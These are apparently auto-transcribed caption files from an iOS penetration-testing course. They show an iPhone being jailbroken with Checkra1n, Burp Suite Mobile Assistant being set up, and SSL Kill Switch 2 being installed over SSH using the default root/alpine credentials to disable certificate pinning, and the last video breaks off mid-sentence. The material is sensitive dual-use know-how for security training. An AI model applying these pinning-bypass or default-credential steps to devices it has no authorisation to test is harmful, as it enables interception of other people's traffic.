00:01:17.620 --> 00:01:20.880
have warned you fairly and squarely here, so

29
00:01:20.880 --> 00:01:23.480
do not come to me saying, hey my

30
00:01:23.480 --> 00:01:26.940
device got ransomwared or hey my account got

31
00:01:26.940 --> 00:01:29.120
stolen because of this jailbreak.

32
00:01:29.800 --> 00:01:31.180
You want to be careful here.

33
00:01:32.480 --> 00:01:35.980
You could possibly instal malicious applications by using

34
00:01:35.980 --> 00:01:36.320
this.

35
00:01:36.600 --> 00:01:40.280
You can instal third party applications that are

36
00:01:40.280 --> 00:01:43.740
not intended to be given by Apple to

37
00:01:43.740 --> 00:01:45.240
be used on your phone.

38
00:01:45.700 --> 00:01:47.300
So just keep that in mind before you

39
00:01:47.300 --> 00:01:48.460
go any further.

40
00:01:49.160 --> 00:01:52.960
Jailbreaking though is necessary for doing iOS pen

41
00:01:52.960 --> 00:01:55.240
testing because it's our last resort to be

42
00:01:55.240 --> 00:01:57.220
able to break things like SSL pinning.

43
00:01:57.880 --> 00:01:59.560
Now the jailbreak that we're going to be

44
00:01:59.560 --> 00:02:02.480
using in this course is one called Checkra1n.

45
00:02:02.560 --> 00:02:04.420
It's right here on Google.

46
00:02:04.620 --> 00:02:06.440
You can just do a quick search for

47
00:02:06.440 --> 00:02:07.139
Checkra1n.

48
00:02:07.820 --> 00:02:11.340
Okay, I'm going to click into Checkra1n and

49
00:02:11.340 --> 00:02:13.820
all you really have to do is just

50
00:02:13.820 --> 00:02:17.580
scroll down and download this application for Mac.

51
00:02:17.580 --> 00:02:19.920
I actually have it already installed.

52
00:02:20.820 --> 00:02:22.820
You would just download this for Mac OS,

53
00:02:22.980 --> 00:02:25.920
instal it just like any application, and it's

54
00:02:25.920 --> 00:02:30.340
going to be looking for your Apple device.

55
00:02:30.520 --> 00:02:33.420
I also have my Apple device plugged into

56
00:02:33.420 --> 00:02:34.480
my computer right now.

57
00:02:34.900 --> 00:02:36.360
Let me just show that on the screen.

58
00:02:36.920 --> 00:02:40.100
So here is my iPhone plugged into my

59
00:02:40.100 --> 00:02:40.580
device.

60
00:02:41.240 --> 00:02:44.800
After I have Checkra1n installed properly, I'm going

61
00:02:44.800 --> 00:02:46.600
to open the application here.

62
00:02:46.600 --> 00:02:50.420
Now you can see that right here is

63
00:02:50.420 --> 00:02:51.940
the Checkra1n application.

64
00:02:52.940 --> 00:02:54.760
Now in my case, to be able to

65
00:02:54.760 --> 00:02:59.080
jailbreak because my iPhone is a different version

66
00:02:59.080 --> 00:02:59.720
of iOS.

67
00:02:59.940 --> 00:03:02.720
So it says, sorry iPhone 7 global is

68
00:03:02.720 --> 00:03:06.380
supported but iOS 14.7.1 is not.

69
00:03:06.540 --> 00:03:09.920
So I actually have iOS 14.7.1

70
00:03:09.920 --> 00:03:12.840
installed on my iPhone, but it is still

71
00:03:12.840 --> 00:03:16.340
possible to jailbreak the iPhone because they have

72
00:03:16.340 --> 00:03:18.800
some developer options here in Checkra1n.

73
00:03:19.100 --> 00:03:21.380
So I can actually just click options here

74
00:03:21.380 --> 00:03:25.780
and then click allow untested iOS, iPad, tvOS

75
00:03:26.160 --> 00:03:26.480
versions.

76
00:03:26.860 --> 00:03:28.620
So if Checkra1n is telling you that it

77
00:03:28.620 --> 00:03:31.800
cannot jailbreak your device, you might need to

78
00:03:31.800 --> 00:03:36.420
check this text box to allow the untested

79
00:03:36.420 --> 00:03:37.060
versions.

80
00:03:37.060 --> 00:03:40.940
Because iOS 14.7.1 is pretty new,

81
00:03:41.460 --> 00:03:44.520
they don't necessarily 100% support it at

82
00:03:44.520 --> 00:03:44.980
this point.

83
00:03:45.060 --> 00:03:46.600
I'm sure in the future they will have

84
00:03:46.600 --> 00:03:49.760
some new jailbreaks that will be able to

85
00:03:49.760 --> 00:03:51.340
handle these iOS versions.

86
00:03:51.760 --> 00:03:53.640
Again this is the reason why I wanted

87
00:03:53.640 --> 00:03:56.060
you to have an iDevice with iOS 14

88
00:03:56.060 --> 00:03:58.580
.7.1 or less for this course because

89
00:03:58.580 --> 00:04:01.960
you might have some problems with your jailbreak.

90
00:04:02.480 --> 00:04:05.220
Now before we start doing this, there is

91
00:04:05.220 --> 00:04:07.260
a huge note here saying, please ensure you

92
00:04:07.260 --> 00:04:09.100
have a backup of your device before applying

93
00:04:09.100 --> 00:04:09.740
the jailbreak.

94
00:04:10.220 --> 00:04:12.680
Yes, if the jailbreak fails, it is possible

95
00:04:12.680 --> 00:04:15.760
that your device could be completely bricked and

96
00:04:15.760 --> 00:04:17.120
impossible to use.

97
00:04:17.440 --> 00:04:19.079
So make sure that you're making a backup

98
00:04:19.079 --> 00:04:20.820
of your device before you're doing this.

99
00:04:21.180 --> 00:04:23.160
In my case I'm okay with losing all

100
00:04:23.160 --> 00:04:24.860
my data if something does go wrong.

101
00:04:25.500 --> 00:04:28.300
When I click start here with Checkra1n, it's

102
00:04:28.300 --> 00:04:30.340
going to say it's using an iOS version

103
00:04:30.340 --> 00:04:32.560
that is not supported, but that's okay, so

104
00:04:32.560 --> 00:04:33.480
I'm going to click okay.

105
00:04:34.040 --> 00:04:35.560
Now we're going to click next.

106
00:04:36.120 --> 00:04:38.180
Now on the device itself, it's going to

107
00:04:38.180 --> 00:04:39.940
start entering recovery mode.

108
00:04:40.100 --> 00:04:41.280
I'm not sure if you'll be able to

109
00:04:41.280 --> 00:04:45.360
see this on the iOS device itself.

110
00:04:47.320 --> 00:04:48.980
Yep, it looks like the screen is not

111
00:04:48.980 --> 00:04:53.740
showing, but it's showing a little arrow with

112
00:04:53.740 --> 00:04:57.620
a screen and like a charging cable with

113
00:04:57.620 --> 00:05:01.200
support.apple.com slash iPhone slash restore on

114
00:05:01.200 --> 00:05:01.700
the screen.

115
00:05:02.080 --> 00:05:04.800
I'll probably add some pictures of what this

116
00:05:04.800 --> 00:05:06.960
looks like in the course notes.

117
00:05:07.240 --> 00:05:09.180
So now we need to follow this part

118
00:05:09.180 --> 00:05:12.120
to enter the DFU mode to actually jailbreak

119
00:05:12.120 --> 00:05:13.020
our device here.

120
00:05:13.460 --> 00:05:15.100
We're going to click start here when we're

121
00:05:15.100 --> 00:05:15.320
ready.

122
00:05:15.840 --> 00:05:17.880
Press and hold the side and volume down

123
00:05:17.880 --> 00:05:20.400
buttons together and then release the side button,

124
00:05:20.520 --> 00:05:22.380
but keep holding the volume down button.

125
00:05:22.380 --> 00:05:23.980
You have to do this physically on the

126
00:05:23.980 --> 00:05:26.780
iPhone device while it's still connected to your

127
00:05:26.780 --> 00:05:27.140
laptop.

128
00:05:27.380 --> 00:05:28.260
So I'm going to click start.

129
00:05:28.700 --> 00:05:30.720
I'm going to start pressing and holding the

130
00:05:30.720 --> 00:05:32.760
side and volume down buttons until the screen

131
00:05:32.760 --> 00:05:33.360
goes black.

132
00:05:33.780 --> 00:05:35.400
Then I'm going to release the side button

133
00:05:35.400 --> 00:05:38.280
and keep holding the volume down button until

134
00:05:38.280 --> 00:05:40.120
Checkra1n says I do not have to.

135
00:05:41.440 --> 00:05:43.980
Okay, and it looks like it's going here.

136
00:05:46.560 --> 00:05:49.360
And eventually you will start to see some

137
00:05:49.360 --> 00:05:52.340
letters scrolling across the screen and it's going

138
00:05:52.340 --> 00:05:55.380
to say like Checkra1n and boot up the

139
00:05:55.380 --> 00:05:57.740
device again and start to jailbreak.

140
00:05:58.100 --> 00:06:01.520
Should have the Apple logo with like the

141
00:06:01.520 --> 00:06:04.680
Checkmate symbol, the Checkra1n symbol on there.

142
00:06:05.000 --> 00:06:06.360
You can see now that the device is

143
00:06:06.360 --> 00:06:08.220
booting according to Checkra1n.

144
00:06:08.460 --> 00:06:11.620
I'll add some pictures of this in the

145
00:06:11.620 --> 00:06:13.100
course notes as well so you know that

146
00:06:13.100 --> 00:06:14.320
the process is happening.

147
00:06:15.100 --> 00:06:17.400
Okay, and I am back into my iPhone

148
00:06:17.400 --> 00:06:18.720
device now physically.

149
00:06:19.100 --> 00:06:21.380
It should pop right back up here.

150
00:06:21.720 --> 00:06:22.720
Yep, here we go.

151
00:06:22.860 --> 00:06:25.420
So here is my now jailbroken device.

152
00:06:25.560 --> 00:06:27.260
I'm going to get some error messages here

153
00:06:27.260 --> 00:06:28.840
for messages that did not send.

154
00:06:29.420 --> 00:06:34.540
And if you see this Cydia or Kydia

155
00:06:34.540 --> 00:06:38.320
application then a jailbreak has worked successfully.

156
00:06:38.700 --> 00:06:40.200
So this is how you know that the

157
00:06:40.200 --> 00:06:41.860
jailbreak has worked successfully.

158
00:06:42.260 --> 00:06:46.120
You can see that we have Cydia installed

159
00:06:46.120 --> 00:06:46.740
here.

160
00:06:47.940 --> 00:06:52.600
Oops, looks like I'm having some errors here

161
00:06:52.600 --> 00:06:54.380
because I have a proxy set up.

162
00:06:54.460 --> 00:06:56.220
Let me turn off my proxy real quick.

163
00:07:13.480 --> 00:07:15.540
Okay, so here we are in Cydia or

164
00:07:15.540 --> 00:07:17.280
Kydia, however you say it.

165
00:07:17.680 --> 00:07:19.080
And this is where we would be able

166
00:07:19.080 --> 00:07:21.900
to actually instal a tonne of different applications

167
00:07:21.900 --> 00:07:24.700
that are not available on the Apple Store.

168
00:07:25.140 --> 00:07:26.460
One of the ones that is going to

169
00:07:26.460 --> 00:07:28.420
be most important is going to be the

170
00:07:28.420 --> 00:07:29.780
Burp Suite Mobile Assistant.

171
00:07:30.020 --> 00:07:31.580
We'll get to that when it's time.

172
00:07:31.580 --> 00:07:34.140
You can also go to the Check Rain

173
00:07:34.140 --> 00:07:36.720
application here and this is how you would

174
00:07:36.720 --> 00:07:39.640
know that the application is jailbroken as well.

175
00:07:40.740 --> 00:07:43.000
So at this point we now have a

176
00:07:43.000 --> 00:07:45.720
jailbroken phone if you are looking at the

177
00:07:45.720 --> 00:07:47.860
Check Rain loader here and you're also looking

178
00:07:47.860 --> 00:07:50.260
at the Kydia installer here.

179
00:07:50.780 --> 00:07:53.360
If you wanted to instal new applications you

180
00:07:53.360 --> 00:07:54.960
can just do a search here and look

181
00:07:54.960 --> 00:07:56.860
for package names, anything like that.

182
00:07:57.160 --> 00:07:58.720
We'll be using this a little bit to

183
00:07:58.720 --> 00:08:01.020
actually instal some tools like the Burp Suite

184
00:08:01.020 --> 00:08:01.900
Mobile Assistant.

185
00:08:02.460 --> 00:08:04.200
So, if you're at this point you have

186
00:08:04.200 --> 00:08:06.500
successfully jailbroken your device.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.580 --> 00:00:02.620
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, in this video I want to cover

2
00:00:02.620 --> 00:00:05.240
a tool called the Burp Suite Mobile Assistant.

3
00:00:05.700 --> 00:00:09.200
Now for clarification, this tool is not working

4
00:00:09.200 --> 00:00:10.480
on my iPhone at all.

5
00:00:10.920 --> 00:00:12.480
I think it might be because of the

6
00:00:12.480 --> 00:00:14.840
version of iOS that I'm actually using because

7
00:00:14.840 --> 00:00:17.480
it's on iOS 14.7. I think it

8
00:00:17.480 --> 00:00:19.600
might be a bit of a too high

9
00:00:19.600 --> 00:00:21.640
of a version of iOS for the Burp

10
00:00:21.640 --> 00:00:27.120
Suite Mobile Assistant to work properly, but I

11
00:00:27.120 --> 00:00:29.560
wanted to cover the tool anyway so that

12
00:00:29.560 --> 00:00:32.420
you have some idea overall of how to

13
00:00:32.420 --> 00:00:35.420
use it and, you know, if you wanted

14
00:00:35.420 --> 00:00:37.500
to try it on your device it would

15
00:00:37.500 --> 00:00:43.960
allow you to utilize this tool effectively and

16
00:00:43.960 --> 00:00:46.060
just to have it as another tool in

17
00:00:46.060 --> 00:00:47.440
your tool belt overall.

18
00:00:48.460 --> 00:00:53.560
So here is the page on portswigger.net

19
00:00:53.560 --> 00:00:56.780
for installing Burp Suite Mobile Assistant and basically

20
00:00:56.780 --> 00:00:58.240
you can get to this page just by

21
00:00:58.240 --> 00:01:00.460
doing a quick google search for Burp Suite

22
00:01:00.460 --> 00:01:03.580
Mobile Assistant and this is specifically used for

23
00:01:03.580 --> 00:01:08.060
iOS devices to install the Burp Suite Mobile

24
00:01:08.060 --> 00:01:10.300
Assistant, this instruction set, so you know where

25
00:01:10.300 --> 00:01:11.820
everything really came from.

26
00:01:12.460 --> 00:01:14.140
Now in the previous videos we already had

27
00:01:14.140 --> 00:01:16.680
Burp Suite set up and intercepting our application

28
00:01:16.680 --> 00:01:19.480
traffic, but in some cases the Mobile Assistant

29
00:01:19.480 --> 00:01:22.600
can also help us to break SSL pinning.

30
00:01:23.080 --> 00:01:24.140
So I just want you to have this

31
00:01:24.140 --> 00:01:26.400
as a resource, this web page, so that

32
00:01:26.400 --> 00:01:28.540
you know how to set everything up here.

33
00:01:28.920 --> 00:01:31.320
I'll also link this as well in the

34
00:01:31.320 --> 00:01:32.160
course notes.

35
00:01:32.640 --> 00:01:34.360
Now I'm going to demonstrate how we're going

36
00:01:34.360 --> 00:01:36.480
to set up the Burp Suite Mobile Assistant.

37
00:01:37.580 --> 00:01:40.300
So here I am on my jailbroken iPhone

38
00:01:40.300 --> 00:01:43.580
and I'm in the Kaidia or Saidia store

39
00:01:43.580 --> 00:01:46.200
here and I'm going to go to sources.

40
00:01:46.640 --> 00:01:48.860
I'm going to click edit here and I'm

41
00:01:48.860 --> 00:01:51.660
going to click add and here I'm going

42
00:01:51.660 --> 00:01:56.640
to fill in the URL of my MacBook

43
00:01:56.640 --> 00:01:59.320
and the port where it's running Burp Suite.

44
00:01:59.700 --> 00:02:01.480
Now the problem here is that it has

45
00:02:01.480 --> 00:02:04.340
https colon slash slash, we need to change

46
00:02:04.340 --> 00:02:09.400
that to http colon slash slash and then

47
00:02:09.400 --> 00:02:12.160
we could actually just do like burp colon

48
00:02:12.160 --> 00:02:14.700
8082 if we wanted to do it like

49
00:02:14.700 --> 00:02:15.000
that.

50
00:02:15.120 --> 00:02:16.400
This should work as well.

51
00:02:16.700 --> 00:02:18.120
You can see it's updating sources.

52
00:02:18.560 --> 00:02:21.040
You could also just put the IP address

53
00:02:21.040 --> 00:02:22.460
of your MacBook in there.

54
00:02:22.820 --> 00:02:25.140
As you might know, putting burp in there

55
00:02:25.140 --> 00:02:28.060
as the URL basically is directing it to

56
00:02:28.060 --> 00:02:30.980
your MacBook anyway, wherever Burp Suite is running.

57
00:02:32.220 --> 00:02:33.900
Okay and now we can see this Burp

58
00:02:33.900 --> 00:02:36.320
Suite Pro has popped up in the sources

59
00:02:36.320 --> 00:02:36.700
here.

60
00:02:36.800 --> 00:02:38.980
I'm going to click that, click all packages.

61
00:02:52.100 --> 00:02:53.900
I actually don't see the package here.

62
00:02:54.000 --> 00:02:55.520
Let me just try to edit this.

63
00:03:05.370 --> 00:03:08.770
Let me try by putting in the IP

64
00:03:08.770 --> 00:03:09.990
of the actual MacBook.

65
00:03:11.990 --> 00:03:17.310
So http colon slash slash 192.168.127

66
00:03:17.310 --> 00:03:19.370
.198 port 8082.

67
00:03:28.120 --> 00:03:29.620
See if this makes any difference.

68
00:03:37.100 --> 00:03:39.120
The reason why the mobile assistant was not

69
00:03:39.120 --> 00:03:41.040
showing was because I actually had this already

70
00:03:41.040 --> 00:03:41.640
installed.

71
00:03:43.280 --> 00:03:46.600
But in that sources tab, what you would

72
00:03:46.600 --> 00:03:48.680
do on the very first time is that

73
00:03:48.680 --> 00:03:50.480
you would go to this all packages section.

74
00:03:50.640 --> 00:03:53.020
You would actually see mobile assistant labeled here

75
00:03:53.020 --> 00:03:54.660
and that's how you would know the mobile

76
00:03:54.660 --> 00:03:56.220
assistant is installed.

77
00:03:56.920 --> 00:03:58.000
So I'm going to go here to the

78
00:03:58.000 --> 00:03:58.780
mobile assistant.

79
00:03:59.040 --> 00:04:01.020
You can see that this is the package

80
00:04:01.020 --> 00:04:11.020
installed and if I look

81
00:04:11.020 --> 00:04:12.820
for the mobile assistant, I took this off

82
00:04:12.820 --> 00:04:13.820
of my home screen.

83
00:04:14.480 --> 00:04:16.820
There's the mobile assistant and here you can

84
00:04:16.820 --> 00:04:19.420
actually put in all of your host information.

85
00:04:20.019 --> 00:04:22.860
Again this would be essentially the IP address

86
00:04:22.860 --> 00:04:28.920
of your MacBook and then the port.

87
00:04:30.760 --> 00:04:32.100
Click use as proxy.

88
00:04:32.620 --> 00:04:34.820
Install the CA certificate just as before.

89
00:04:34.940 --> 00:04:36.480
It can help to just speed up the

90
00:04:36.480 --> 00:04:37.580
process a little bit.

91
00:04:38.520 --> 00:04:41.400
And then you can also verify that this

92
00:04:41.400 --> 00:04:43.200
is working by clicking test settings.

93
00:04:43.580 --> 00:04:44.340
You're going to see I'm going to get

94
00:04:44.340 --> 00:04:47.000
this failure here saying the CA certificate is

95
00:04:47.000 --> 00:04:47.860
not installed.

96
00:04:48.340 --> 00:04:49.980
Now that is not true because if we

97
00:04:49.980 --> 00:04:52.700
actually go to the settings, of course, go

98
00:04:52.700 --> 00:04:55.040
to general and the certificate trust store and

99
00:04:55.040 --> 00:04:57.280
all that stuff, these profiles, we already know

100
00:04:57.280 --> 00:04:59.200
the port swagger CA is trusted.

101
00:04:59.740 --> 00:05:01.480
But I think this is only happening because

102
00:05:01.480 --> 00:05:03.000
of my version of iOS.

103
00:05:03.760 --> 00:05:06.120
So I still wanted to show you the

104
00:05:06.120 --> 00:05:08.840
burp suite mobile assistant tool so that you

105
00:05:08.840 --> 00:05:10.760
can actually use this if you have an

106
00:05:10.760 --> 00:05:13.800
older version of iOS than 14.7. This

107
00:05:13.800 --> 00:05:16.160
might still be a helpful tool for you.

108
00:05:16.680 --> 00:05:18.420
Now in my case because the burp suite

109
00:05:18.420 --> 00:05:21.940
mobile assistant did not work properly, next I'm

110
00:05:21.940 --> 00:05:24.180
going to go ahead and actually install the

111
00:05:24.180 --> 00:05:28.120
SSL kill chain application which is going to

112
00:05:28.120 --> 00:05:30.360
help us to break SSL pinning anyway.

113
00:05:30.820 --> 00:05:32.900
So if installing the burp suite mobile assistant

114
00:05:32.900 --> 00:05:34.520
does not work for you, maybe you get

115
00:05:34.520 --> 00:05:36.700
that certificate error, then you're going to want

116
00:05:36.700 --> 00:05:39.020
to go to the video and learn how

117
00:05:39.020 --> 00:05:41.640
to install SSL kill chain as well.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.720 --> 00:00:02.400
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, the final tool we're going to be

2
00:00:02.400 --> 00:00:05.660
installing onto our iOS device is a tool

3
00:00:05.660 --> 00:00:07.240
called SSL Killchain.

4
00:00:07.540 --> 00:00:09.300
You can find it here on GitHub, I

5
00:00:09.300 --> 00:00:11.440
just did a quick google search for SSL

6
00:00:11.440 --> 00:00:16.160
Killchain, SSL Killchain version 2, and the interesting

7
00:00:16.160 --> 00:00:18.220
thing about this actually is that they say

8
00:00:18.220 --> 00:00:21.280
this is not able to be supported on

9
00:00:21.280 --> 00:00:24.420
anything over iOS 14.2, but I was

10
00:00:24.420 --> 00:00:26.660
actually able to get this to work by

11
00:00:26.660 --> 00:00:29.880
using the Kydea substitute.

12
00:00:30.440 --> 00:00:33.060
So there is actually a solution here for

13
00:00:33.060 --> 00:00:36.640
our specific device, and just to give you

14
00:00:36.640 --> 00:00:38.340
some background, basically this is going to be

15
00:00:38.340 --> 00:00:39.700
a tool we're going to be installing through

16
00:00:39.700 --> 00:00:43.080
our jailbreak, and downloading this locally onto our

17
00:00:43.080 --> 00:00:46.060
MacBook, pushing it to our iPhone, and running

18
00:00:46.060 --> 00:00:51.660
it on there to make the application work

19
00:00:51.660 --> 00:00:55.240
properly and break SSL pinning from within our

20
00:00:55.240 --> 00:00:56.500
iPhone itself.

21
00:00:57.220 --> 00:00:59.400
Now in terms of making this run, we're

22
00:00:59.400 --> 00:01:01.580
going to be following this article here for

23
00:01:01.580 --> 00:01:05.000
iOS 14.3 support that is under the

24
00:01:05.000 --> 00:01:07.040
issues for SSL Killchain.

25
00:01:07.600 --> 00:01:12.080
Again, it is officially not supported for anything

26
00:01:12.080 --> 00:01:15.600
above iOS 14.2, but this article actually

27
00:01:15.600 --> 00:01:18.160
teaches you exactly how to do this.

28
00:01:19.560 --> 00:01:22.920
And scrolling down here, this instruction set is

29
00:01:22.920 --> 00:01:24.220
pretty much what we're going to be doing.

30
00:01:24.600 --> 00:01:27.400
We're going to open Kydea and install wgit.

31
00:01:27.480 --> 00:01:29.780
We'll actually be able to do a wgit

32
00:01:29.780 --> 00:01:32.780
here, and pull the release off of the

33
00:01:32.780 --> 00:01:36.020
GitHub repository, and run it on our phone,

34
00:01:36.040 --> 00:01:38.200
and we're going to also need to install

35
00:01:38.200 --> 00:01:39.280
the Kydea substitute.

36
00:01:39.900 --> 00:01:42.620
So let's go over to our iPhone now,

37
00:01:42.680 --> 00:01:44.280
show you exactly what I mean here.

38
00:01:44.880 --> 00:01:46.260
Let's log in real quick.

39
00:01:46.720 --> 00:01:48.720
I'm going to go to sources here.

40
00:01:49.720 --> 00:01:52.400
Sorry, install, or sorry, search is what I'm

41
00:01:52.400 --> 00:01:54.980
going to go to, and I'm going to

42
00:01:54.980 --> 00:01:58.020
search for substitute first of all, and this

43
00:01:58.020 --> 00:01:59.300
is the Kydea substitute.

44
00:01:59.720 --> 00:02:02.120
I'm going to click modify, and click install,

45
00:02:02.400 --> 00:02:04.740
confirm, and download the substitute.

46
00:02:05.320 --> 00:02:07.259
This is going to actually allow us to

47
00:02:07.259 --> 00:02:11.880
run the SSL Killchain when it's finally installed.

48
00:02:12.000 --> 00:02:13.960
I actually had to do this first on

49
00:02:13.960 --> 00:02:15.060
this phone in particular.

50
00:02:15.440 --> 00:02:17.180
You may or may not need it depending

51
00:02:17.180 --> 00:02:19.800
on which version of iOS you're using, but

52
00:02:19.800 --> 00:02:21.800
for me, I definitely needed to have the

53
00:02:21.800 --> 00:02:22.160
substitute.

54
00:02:22.640 --> 00:02:25.100
You can tell the substitute was installed properly

55
00:02:25.100 --> 00:02:28.340
when you see this substitute menu here, and

56
00:02:28.340 --> 00:02:31.000
this will enable us to use things like

57
00:02:31.000 --> 00:02:31.920
tweaks, etc.

58
00:02:32.160 --> 00:02:36.020
to expand the functionality of our jailbroken iPhone.

59
00:02:37.000 --> 00:02:38.280
Okay, so now I'm going to go back

60
00:02:38.280 --> 00:02:40.560
to the Kydea store, go to search, and

61
00:02:40.560 --> 00:02:43.880
now I'm going to install OpenSSH, and this

62
00:02:43.880 --> 00:02:48.420
is going to allow me to SSH directly

63
00:02:48.420 --> 00:02:49.560
into this phone.

64
00:02:49.660 --> 00:02:52.300
I'm going to click install, confirm, install all

65
00:02:52.300 --> 00:02:54.320
the OpenSSH packages here.

66
00:02:55.740 --> 00:02:58.760
Okay, and the default username and password for

67
00:02:58.760 --> 00:03:01.520
OpenSSH here is Alpine Alpine.

68
00:03:01.940 --> 00:03:04.360
Obviously, you're pretty much opening up an entire

69
00:03:04.360 --> 00:03:06.880
new port onto your iPhone, allowing you to

70
00:03:06.880 --> 00:03:09.960
SSH using these default credentials, so if you

71
00:03:09.960 --> 00:03:11.620
do not like that, make sure you change

72
00:03:11.620 --> 00:03:15.440
the default credentials or uninstall OpenSSH if you're

73
00:03:15.440 --> 00:03:17.060
going to be walking around with this phone

74
00:03:17.060 --> 00:03:19.600
to various places, because that would be a

75
00:03:19.600 --> 00:03:22.480
very bad vulnerability to have onto your phone.

76
00:03:23.000 --> 00:03:25.080
The other thing we could install, as per

77
00:03:25.080 --> 00:03:28.140
these instructions shown on GitHub, is the wget

78
00:03:28.140 --> 00:03:28.460
command.

79
00:03:29.040 --> 00:03:31.080
We don't necessarily have to do this, we

80
00:03:31.080 --> 00:03:31.700
don't want to.

81
00:03:31.760 --> 00:03:36.600
We could wget this onto our MacBook, so

82
00:03:36.600 --> 00:03:37.880
I'm going to do that now in my

83
00:03:37.880 --> 00:03:38.200
case.

84
00:03:38.280 --> 00:03:40.320
First, we're going to make sure that OpenSSH

85
00:03:40.320 --> 00:03:41.420
is actually running.

86
00:03:41.700 --> 00:03:43.400
I'm going to go to my terminal here,

87
00:03:43.720 --> 00:03:46.920
scroll down, and just clear this out, and

88
00:03:46.920 --> 00:03:49.380
I'm going to get my IP address of

89
00:03:49.380 --> 00:03:50.660
my iPhone now.

90
00:03:50.760 --> 00:03:54.520
Go to settings, Wi-Fi, click here, and

91
00:03:54.520 --> 00:03:55.780
see your IP address.

92
00:03:55.840 --> 00:03:58.540
In my case, it is 192.168.127

93
00:03:58.540 --> 00:04:01.500
.228, so I'm going to just do SSH

94
00:04:01.500 --> 00:04:14.760
here, Alpine at 192.168.127.228 and

95
00:04:14.760 --> 00:04:17.000
now it's going to ask about the authenticity

96
00:04:17.000 --> 00:04:17.640
of the host.

97
00:04:17.740 --> 00:04:20.079
You can just say yes to this, and

98
00:04:20.079 --> 00:04:22.680
then the password here is also Alpine.

99
00:04:32.290 --> 00:04:33.770
Yes, okay, sorry about that.

100
00:04:33.870 --> 00:04:36.030
The username was actually root and the password

101
00:04:36.030 --> 00:04:39.070
is Alpine, so make sure you're changing that

102
00:04:39.070 --> 00:04:40.610
default password if you're going to be using

103
00:04:40.610 --> 00:04:42.750
this for more than just file transfers.

104
00:04:43.050 --> 00:04:45.270
So now we actually have a root shell

105
00:04:45.270 --> 00:04:46.890
onto our iPhone here.

106
00:04:47.070 --> 00:04:49.130
We can ls and everything like that.

107
00:04:49.350 --> 00:04:50.810
We can try the wget command.

108
00:04:51.310 --> 00:04:53.650
In my case, I already have this installed,

109
00:04:53.930 --> 00:04:55.930
so actually all I need to do now

110
00:04:55.930 --> 00:05:03.550
is just copy this wget command and paste

111
00:05:03.550 --> 00:05:11.300
it into my shell, and it looks like

112
00:05:11.300 --> 00:05:13.960
I actually had a space there, so that

113
00:05:13.960 --> 00:05:14.740
did not work.

114
00:05:15.080 --> 00:05:16.680
You can see there was like a space

115
00:05:16.680 --> 00:05:19.860
right here between these two, but I can

116
00:05:19.860 --> 00:05:22.180
just take this front part now and add

117
00:05:22.180 --> 00:05:23.540
it on to the front.

118
00:05:24.960 --> 00:05:26.520
There we go, we have everything in one

119
00:05:26.520 --> 00:05:27.120
line now.

120
00:05:27.380 --> 00:05:31.120
Okay, so now we have wget and got

121
00:05:31.120 --> 00:05:34.260
the actual .deb package here for SSL Kill

122
00:05:34.260 --> 00:05:34.520
Switch.

123
00:05:34.800 --> 00:05:37.080
There's obviously tons of different ways that you

124
00:05:37.080 --> 00:05:39.080
could get this file onto your iPhone.

125
00:05:39.360 --> 00:05:42.060
You could do scp transfer, you could like

126
00:05:42.060 --> 00:05:44.840
download this .deb file to your MacBook and

127
00:05:44.840 --> 00:05:46.540
then transfer it over to the iPhone.

128
00:05:46.540 --> 00:05:48.560
In my case, I just use the iPhone

129
00:05:48.560 --> 00:05:51.860
to do a wget here and just get

130
00:05:51.860 --> 00:05:54.760
the file onto the device directly, but there's

131
00:05:54.760 --> 00:05:56.120
tons of different ways you could do this

132
00:05:56.120 --> 00:05:56.520
as well.

133
00:05:56.640 --> 00:05:58.460
You don't necessarily have to do it through

134
00:05:58.460 --> 00:05:59.060
wget.

135
00:05:59.620 --> 00:06:01.480
Okay, so now that this is installed, we're

136
00:06:01.480 --> 00:06:04.800
going to use this command dpkg-i and

137
00:06:04.800 --> 00:06:06.440
the name of our package there.

138
00:06:06.820 --> 00:06:08.400
I'm just going to copy and paste that

139
00:06:08.400 --> 00:06:12.400
into this terminal, and this should allow us

140
00:06:12.400 --> 00:06:14.220
to run the thing.

141
00:06:14.320 --> 00:06:16.820
We got this error here and this actually

142
00:06:16.820 --> 00:06:19.980
has a nice little fix here as well.

143
00:06:20.060 --> 00:06:21.240
It says if you get an error then

144
00:06:21.240 --> 00:06:23.460
fire this command, so we're going to do

145
00:06:23.460 --> 00:06:29.230
the apt fix broken install now, and this

146
00:06:29.230 --> 00:06:30.990
should fix that package.

147
00:06:31.190 --> 00:06:32.810
Let's do a yes there, and now you

148
00:06:32.810 --> 00:06:35.310
can see we have SSL Kill Switch 2

149
00:06:35.310 --> 00:06:37.230
installed onto our iPhone.

150
00:06:37.390 --> 00:06:38.910
Now it says we're going to open the

151
00:06:38.910 --> 00:06:41.630
iOS settings, scroll down to SSL Kill Switch

152
00:06:41.630 --> 00:06:45.430
2, and click disable certificate pinning.

153
00:06:45.530 --> 00:06:49.430
So let's see if our application actually loaded

154
00:06:49.430 --> 00:06:50.010
correctly.

155
00:06:50.210 --> 00:06:52.190
I'm going to go down here, and now

156
00:06:52.190 --> 00:06:54.570
let me close this out actually.

157
00:06:55.710 --> 00:06:58.290
Go here, make sure everything's good in the

158
00:06:58.290 --> 00:06:58.770
substitute.

159
00:07:00.230 --> 00:07:02.870
I might need to go to make sure

160
00:07:02.870 --> 00:07:05.770
we can see the SSL Kill Chain package.

161
00:07:13.890 --> 00:07:15.190
It's not there yet.

162
00:07:16.150 --> 00:07:34.260
Let me try this command again, and

163
00:07:34.260 --> 00:07:36.240
now we see the SSL Kill Switch 2

164
00:07:36.240 --> 00:07:37.400
is actually installed.

165
00:07:37.720 --> 00:07:40.220
I just had to close the settings app

166
00:07:40.220 --> 00:07:42.100
and reopen it for it to pop up

167
00:07:42.100 --> 00:07:44.160
here, and I tried to install that package

168
00:07:44.160 --> 00:07:46.100
again just to make sure everything was working

169
00:07:46.100 --> 00:07:46.620
properly.

170
00:07:47.100 --> 00:07:48.480
So now all I have to do is

171
00:07:48.480 --> 00:07:51.300
click SSL Kill Switch, and if this was

172
00:07:51.300 --> 00:07:53.180
toggled off, you would toggle it on.

173
00:07:53.500 --> 00:07:56.180
So now we should be disabling certificate validation.

174
00:07:56.560 --> 00:07:59.640
We can actually verify this by using like

175
